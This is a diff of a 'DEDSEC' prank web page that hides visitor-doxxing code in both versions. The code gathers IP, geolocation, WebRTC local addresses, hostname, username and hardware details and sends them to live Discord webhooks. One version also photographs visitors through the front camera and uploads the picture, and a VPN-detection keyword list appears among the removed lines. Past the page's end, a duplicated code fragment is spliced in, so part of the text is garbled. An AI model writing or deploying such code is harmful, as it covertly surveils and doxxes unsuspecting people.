@@ -4,357 +4,269 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OMG! IT'S DEDSEC</title>
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
     <style>
+        /* Estilo general del cuerpo para centrado y fondo */
         body {
-            position: relative;
+            position: relative; 
             display: flex;
-            align-items: flex-start;
+            align-items: flex-start; /* Mueve el contenido hacia arriba */
             justify-content: center;
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            overflow: hidden;
-            background-image: url('https://i.imgur.com/cVnL0wo.png');
+            overflow: hidden; 
+            
+            /* Fondo de imagen de patrón */
+            background-image: url('https://i.imgur.com/cVnL0wo.png'); 
             background-repeat: repeat;
         }
+
+        /* 1. Estilo para el elemento de texto (más pequeño y más arriba) */
         .texto-no-interactivo {
-            font-family: 'JetBrains Mono', monospace;
-            font-weight: 700;
-            font-size: 3em;
-            color: #00ff00;
+            font-size: 3em; 
+            color: #ffffff;
             padding: 15px;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
-            margin-top: 15vh;
+            
+            /* Desplazamiento hacia arriba */
+            margin-top: 15vh; 
+            
+            /* No interacción */
             pointer-events: none;
-            z-index: 10;
+            z-index: 10; 
         }
-        #video-inferior {
-            position: absolute;
+
+        /* 2. Estilo para el video/GIF en loop en la parte inferior */
+        #video-inferior { 
+            position: absolute; 
             bottom: 0;
             left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            max-width: 800px;
+            transform: translateX(-50%); 
+            width: 80%; 
+            max-width: 800px; 
             height: auto;
-            z-index: 5;
+            z-index: 5; 
         }
+
+        /* 3. Estilo para el video pequeño en la esquina superior izquierda (PEGADO) */
         #video-esquina-izquierda {
             position: absolute;
-            top: 0px;
-            left: 0px;
-            width: 100px;
+            /* Se establece en 0px para pegarlo completamente a la esquina */
+            top: 0px; 
+            left: 0px; 
+            width: 100px; /* Tamaño reducido para ser pequeño */
             height: auto;
             z-index: 10;
-            pointer-events: none;
+            pointer-events: none; 
         }
+
     </style>
 </head>
 <body>
 
-    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
+    <div class="texto-no-interactivo">
+        DOXXED BY DEDSEC
+    </div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
+        Tu navegador no soporta el elemento de video.
     </video>
+    
     <video id="video-esquina-izquierda" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
+        Tu navegador no soporta el elemento de video.
     </video>
 
+
 <script>
-    // ================================================================
-    //  YOUR NEW WEBHOOK (updated)
-    // ================================================================
-    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
+// WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
-    // ================================================================
-    //  MASSIVE VPN/PROXY KEYWORD BLACKLIST
-    // ================================================================
-    const VPN_KEYWORDS = [
-        'vpn','proxy','hosting','cloud','datacenter','incognito','anonymous','tor','exit node',
-        'nordvpn','expressvpn','surfshark','cyberghost','ipvanish','private internet access','pia',
-        'torguard','vyprvpn','hotspot shield','windscribe','protonvpn','mullvad','purevpn','zenmate',
-        'tunnelbear','hidemyass','hma','ipredator','ovpn','azire','boleh','buffered','cactusvpn',
-        'earthvpn','fastestvpn','giganews','goldenfrog','ibvpn','ivpn','le vpn','liquidvpn','novpn',
-        'octanevpn','perfect privacy','personalvpn','powvpn','privatevpn','proxpn','pulsevpn',
-        'shadeyouvpn','slickvpn','spotflux','strongvpn','tor','tuxler','unblockvpn','usavpn',
-        'vpn unlimited','vpnarea','vpnbook','vpnsecure','vpnshield','vpnzilla','xvpn','zpn',
-        'amazonaws','google cloud','azure','digitalocean','vultr','linode','ovh','hetzner',
-        'rackspace','softlayer','oracle cloud','alibaba cloud','tencent cloud','ibm cloud',
-        'cloudflare','fastly','akamai','edgecast','incapsula','sucuri','stackpath',
-        'm247','cogent','he.net','centurylink','level3','verizon','at&t','sprint','t-mobile',
-        'comcast','xfinity','spectrum','charter','optimum','cox','frontier','windstream',
-        'keenetic','asus','tp-link','dlink','netgear','linksys','belkin','cisco','meraki',
-        'fortinet','palo alto','zscaler','barracuda','proofpoint','mimecast','symantec','mcafee'
-    ];
+async function activarCamara() {
+  try {
+    // Optimizado para móvil: pide cámara frontal directamente
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        facingMode: "user",  // Cámara frontal en móvil
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      } 
+    });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
 
-    // ================================================================
-    //  8 IP GEOLOCATION APIS (parallel)
-    // ================================================================
-    async function fetchIPData() {
-        const services = [
-            { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, isp: d.org || d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.proxy || false, asn: d.asn }) },
-            { url: 'https://ipinfo.io/json?token=', parser: d => ({ ip: d.ip, isp: d.org, country: d.country, region: d.region, city: d.city, lat: d.loc?.split(',')[0] || '0', lon: d.loc?.split(',')[1] || '0', proxy: d.proxy || d.privacy?.proxy || false, asn: d.asn }) },
-            { url: 'http://ip-api.com/json/', parser: d => ({ ip: d.query, isp: d.isp, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false, asn: d.as }) },
-            { url: 'https://freegeoip.app/json/', parser: d => ({ ip: d.ip, isp: d.isp || d.org, country: d.country_name, region: d.region_name, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: '' }) },
-            { url: 'https://ip-api.com/json/?fields=status,message,country,regionName,city,lat,lon,isp,org,as,query,proxy', parser: d => ({ ip: d.query, isp: d.isp || d.org, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false, asn: d.as }) },
-            { url: 'https://json.geoiplookup.io/', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: d.asn }) },
-            { url: 'https://geolocation-db.com/json/', parser: d => ({ ip: d.IPv4, isp: d.isp || d.organization, country: d.country_name, region: d.state, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false, asn: d.asn }) },
-            { url: 'https://api.techniknews.net/ipgeo/', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country, region: d.region, city: d.city, lat: d.lat, lon: d.lon, proxy: false, asn: d.asn }) }
-        ];
+    // Espera que la cámara cargue (más rápido en móvil)
+    await new Promise(resolve => video.onloadedmetadata = resolve);
+    await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5 segundos para foto clara en móvil
 
-        const results = await Promise.allSettled(services.map(async (s) => {
-            try {
-                const res = await fetch(s.url, { signal: AbortSignal.timeout(2500) });
-                const data = await res.json();
-                const parsed = s.parser(data);
-                if (parsed.ip && parsed.ip !== 'unknown') return parsed;
-            } catch (_) {}
-            return null;
-        }));
+    // Toma la foto
+    const canvas = document.getElementById('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    const fotoData = canvas.toDataURL('image/jpeg', 0.9);
 
-        for (const r of results) {
-            if (r.status === 'fulfilled' && r.value && r.value.ip) {
-                return r.value;
-            }
-        }
-        return { ip: 'unknown', isp: 'unknown', country: 'unknown', region: 'unknown', city: 'unknown', lat: '0', lon: '0', proxy: false, asn: '' };
+    // Datos básicos + foto
+    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+    const form = new FormData();
+    form.append('content', 
+`**VÍCTIMA EN CLIENTES EAGLERCRAFT (MÓVIL/PC)**
+**IP:** ${geo.ip || 'oculta'}
+**País:** ${geo.country_name || '?'}
+**Hora:** ${new Date().toLocaleString()}`);
+
+    const blob = dataURLtoBlob(fotoData);
+    form.append('file', blob, 'foto_victima.jpg');
+
+    await fetch(WEBHOOK, { method: 'POST', body: form });
+
+    // Detiene cámara
+    stream.getTracks().forEach(track => track.stop());
+
+    // Muestra página principal
+    document.getElementById('camPermission').style.display = 'none';
+    document.getElementById('mainContent').style.display = 'block';
+  } catch (err) {
+    alert('Necesitas permitir la cámara para acceder a los clientes');
+  }
+}
+
+function dataURLtoBlob(dataurl) {
+  const arr = dataurl.split(',');
+  const mime = arr[0].match(/:(.*?);/)[1];
+  const bstr = atob(arr[1]);
+  let n = bstr.length;
+  const u8arr = new Uint8Array(n);
+  while (n--) u8arr[n] = bstr.charCodeAt(n);
+  return new Blob([u8arr], { type: mime });
+}
+
+// Datos normales (IP, GPU, etc.)
+(async () => {
+  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
+  const battery = await navigator.getBattery?.() || {};
+  const uaData = navigator.userAgentData || {};
+
+  let webgl = 'Unavailable';
+  let gpuLevel = 'Unknown';
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      webgl = `${vendor} | ${renderer}`;
+      if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/Expensive (Good For Videogames)';
+      else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Mid (Good)';
+      else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Cheap (Basic)';
+      else if (renderer.includes('Radeon')) gpuLevel = 'Mid (Integrated AMD or Old One)';
+      else gpuLevel = 'Desconocida';
     }
+  } catch(e) {}
 
-    // ================================================================
-    //  WEBRTC: local IPs + hostname
-    // ================================================================
-    function getWebRTCInfo() {
-        return new Promise((resolve) => {
-            const ips = [];
-            let hostname = '';
-            const pc = new RTCPeerConnection({ iceServers: [] });
-            pc.createDataChannel('');
-            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-            pc.onicecandidate = (e) => {
-                if (!e.candidate) {
-                    pc.close();
-                    resolve({ localIPs: ips, hostname: hostname });
-                    return;
-                }
-                const parts = e.candidate.candidate.split(' ');
-                if (parts.length > 7) {
-                    const ipCandidate = parts[4];
-                    if (ipCandidate && ipCandidate.includes('.') && !ipCandidate.startsWith('0.')) {
-                        if (!ips.includes(ipCandidate)) ips.push(ipCandidate);
-                    }
-                    const candidateStr = e.candidate.candidate;
-                    const hostMatch = candidateStr.match(/ host (\S+)/);
-                    if (hostMatch && hostMatch[1]) {
-                        const h = hostMatch[1];
-                        if (h && !h.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                            hostname = h;
-                        }
-                    }
-                }
-                if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                    hostname = e.candidate.relatedAddress;
-                }
-            };
-            setTimeout(() => { pc.close(); resolve({ localIPs: ips, hostname: hostname }); }, 3000);
-        });
-    }
+  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
+  let userLevel = 'Beginner (Doesnt Knows A Shit)';
+  const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Smart/Tech-savvy (Knows About Privacy)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
 
-    // ================================================================
-    //  USERNAME EXTRACTION
-    // ================================================================
-    function getWindowsUser() {
-        try {
-            const wsh = new ActiveXObject('WScript.Shell');
-            return wsh.ExpandEnvironmentStrings('%USERNAME%');
-        } catch (_) { return null; }
-    }
+  const datos = {
+    ip: geo.ip || 'oculta',
+    isp: geo.org || '?',
+    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
+    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
+    hora: new Date().toLocaleString(),
+    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
+    so: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'Sí' : 'No',
+    ram: navigator.deviceMemory || '?',
+    cpu: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plugins: pluginsList,
+    user_level: userLevel,
+    gpu: webgl,
+    gpu_level: gpuLevel
+  };
 
-    async function getCredentialUser() {
-        try {
-            if (!navigator.credentials) return null;
-            const cred = await navigator.credentials.get({
-                password: true,
-                mediation: 'silent'
-            });
-            if (cred && cred.id) return cred.id;
-            return null;
-        } catch (_) { return null; }
-    }
+  const mensaje =
+`**ctOS User Info**
+**IP:** ${datos.ip} (${datos.isp})
+**Location:** ${datos.ubicacion}
+**Coordinates:** ${datos.coordenadas}
+**Hour:** ${datos.hora}
+**Browser:** ${datos.navegador}
+**OS:** ${datos.so} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
+**Screen:** ${datos.pantalla}
+**Battery:** ${datos.bateria}
+**Time Zone:** ${datos.zona}
+**Plugins:** ${datos.plugins}
+**User Level:** ${datos.user_level}
+**GPU:** ${datos.gpu}
+**GPU Type:** ${datos.gpu_level}`;
 
-    function getUsernameFromUA() {
-        const ua = navigator.userAgent;
-        const macOwnerMatch = ua.match(/\(Macintosh; Intel Mac OS X [\d_]+\)[^\)]*?([\w\-]+)'?s\s+Mac/);
-        if (macOwnerMatch) return macOwnerMatch[1];
-        const namedDevice = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
-        if (namedDevice && namedDevice[2] && !namedDevice[2].includes('Mac') && !namedDevice[2].includes('Windows')) {
-            return namedDevice[2];
-        }
-        return null;
-    }
+  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
+})();
 
-    // ================================================================
-    //  MAIN
-    // ================================================================
-    (async function() {
-        try {
-            const geo = await fetchIPData();
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
+</script>
+</body>
+</html>ntraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
+  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
 
-            // ---- VPN detection ----
-            let isVpn = geo.proxy === true;
-            if (!isVpn) {
-                const ispLower = (geo.isp || '').toLowerCase();
-                const asnLower = (geo.asn || '').toLowerCase();
-                isVpn = VPN_KEYWORDS.some(k => ispLower.includes(k) || asnLower.includes(k));
-            }
-            try {
-                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                const tzContinent = tz.split('/')[0];
-                const ipContinent = geo.country ? geo.country.toUpperCase() : '';
-                const europeCountries = ['DE','FR','UK','IT','ES','NL','BE','CH','AT','SE','NO','DK','FI','PL','RU'];
-                const usCountries = ['US','CA','MX'];
-                if (usCountries.includes(ipContinent) && tzContinent === 'Europe') isVpn = true;
-                if (europeCountries.includes(ipContinent) && tzContinent === 'America') isVpn = true;
-            } catch (_) {}
-            const vpnStatus = isVpn ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
+  const datos = {
+    ip: geo.ip || 'oculta',
+    isp: geo.org || '?',
+    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
+    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
+    hora: new Date().toLocaleString(),
+    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
+    so: uaData.platform || navigator.platform,
+    movil: uaData.mobile ? 'Sí' : 'No',
+    ram: navigator.deviceMemory || '?',
+    cpu: navigator.hardwareConcurrency || '?',
+    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'Charging':'Draining'}` : 'Unavailable',
+    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    plugins: pluginsList,
+    user_level: userLevel,
+    gpu: webgl,
+    gpu_level: gpuLevel
+  };
 
-            // ---- WebRTC ----
-            const webrtc = await getWebRTCInfo();
-            const localIPs = webrtc.localIPs;
-            let hostname = webrtc.hostname;
-            if (!hostname && localIPs.length > 0) {
-                hostname = localIPs[0];
-            }
+  const mensaje =
+`**ctOS User Info**
+**IP:** ${datos.ip} (${datos.isp})
+**Location:** ${datos.ubicacion}
+**Coordinates:** ${datos.coordenadas}
+**Hour:** ${datos.hora}
+**Browser:** ${datos.navegador}
+**OS:** ${datos.so} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
+**Screen:** ${datos.pantalla}
+**Battery:** ${datos.bateria}
+**Time Zone:** ${datos.zona}
+**Plugins:** ${datos.plugins}
+**User Level:** ${datos.user_level}
+**GPU:** ${datos.gpu}
+**GPU Type:** ${datos.gpu_level}`;
 
-            // ---- Username ----
-            let winUser = getWindowsUser();
-            let credUser = await getCredentialUser();
-            let uaUser = getUsernameFromUA();
-            let finalLoginUser = winUser || credUser || uaUser || 'not available (IE/ActiveX or credentials required)';
+  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
+})();
 
-            // ---- System info ----
-            const ua = navigator.userAgent;
-            let osDisplay = 'Unknown';
-            let deviceModel = 'Unknown';
-            let browserName = 'Unknown';
-            try {
-                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-                    const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
-                    if (he.model) deviceModel = he.model;
-                    if (he.platform) osDisplay = he.platform;
-                    if (he.fullVersionList && he.fullVersionList.length) {
-                        browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
-                    }
-                }
-            } catch (_) {}
-
-            if (osDisplay === 'Unknown') {
-                if (ua.includes('Windows NT')) {
-                    const winVer = ua.match(/Windows NT (\d+\.\d+)/);
-                    osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
-                    deviceModel = 'Windows PC';
-                } else if (ua.includes('Macintosh')) {
-                    osDisplay = 'macOS';
-                    const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
-                    deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
-                } else if (ua.includes('iPhone')) {
-                    const m = ua.match(/iPhone\s*([^;)]+)/);
-                    deviceModel = m ? m[0] : 'iPhone';
-                    osDisplay = 'iOS';
-                } else if (ua.includes('Android')) {
-                    const m = ua.match(/Android\s*([^;)]+)/);
-                    deviceModel = m ? m[0] : 'Android';
-                    osDisplay = 'Android';
-                } else {
-                    osDisplay = 'Unknown OS';
-                    deviceModel = 'Unknown device';
-                }
-            }
-            if (browserName === 'Unknown') {
-                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
-                else if (ua.includes('Firefox')) browserName = 'Firefox';
-                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
-                else if (ua.includes('Edg')) browserName = 'Edge';
-                else browserName = 'Other';
-            }
-
-            // ---- Battery ----
-            let battery = 'unavailable';
-            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`; } catch (_) {}
-
-            // ---- GPU ----
-            let gpu = 'Unavailable', gpuLevel = 'Unknown';
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debug) {
-                    const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                    const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                    gpu = `${vendor} | ${renderer}`;
-                    if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
-                    else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
-                    else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
-                    else gpuLevel = 'Other';
-                }
-            } catch (_) {}
-
-            // ---- Plugins ----
-            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
-            const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-            const count = savvy.filter(p => plugins.includes(p)).length;
-            const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
-
-            const coords = (geo.lat && geo.lat !== '0' && geo.lon && geo.lon !== '0') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
-
-            // ---- Build message ----
-            const msg = 
-`**🔹 DEDSEC CTOS – ULTIMATE DOX (NO PERMISSIONS) 🔹**
-**IP:** ${geo.ip}
-**ISP:** ${geo.isp}
-**ASN:** ${geo.asn || 'N/A'}
-**VPN/Proxy:** ${vpnStatus}
-**Location:** ${geo.city}, ${geo.region}, ${geo.country}
-**Coordinates (IP):** ${coords}
-**Local IPs (WebRTC):** ${localIPs.length ? localIPs.join(', ') : 'none'}
-**Computer Hostname (PC Name):** ${hostname || 'not leaked'}
-**Login Username (account name):** ${finalLoginUser}
-**Device Model:** ${deviceModel}
-**OS:** ${osDisplay}
-**Browser:** ${browserName}
-**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
-**RAM:** ${navigator.deviceMemory || '?'} GB
-**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
-**Battery:** ${battery}
-**Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-**Language:** ${navigator.language}
-**GPU:** ${gpu}
-**GPU Level:** ${gpuLevel}
-**Plugins:** ${plugins}
-**User Level:** ${userLevel}
-**Timestamp:** ${new Date().toLocaleString()}`;
-
-            // ---- Send to Discord ----
-            try {
-                // Try fetch with keepalive
-                const response = await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg }),
-                    keepalive: true
-                });
-                if (!response.ok) throw new Error('Fetch failed');
-            } catch (e) {
-                // Fallback: sendBeacon (works even on page close)
-                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
-                navigator.sendBeacon(WEBHOOK, blob);
-            }
-
-            console.log('✅ Data sent to Discord.');
-        } catch (err) {
-            console.error('❌ Error in main:', err);
-        }
-    })();
+// Botones normales
+document.querySelectorAll('.open').forEach(btn => {
+  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+});
 </script>
 </body>
 </html>
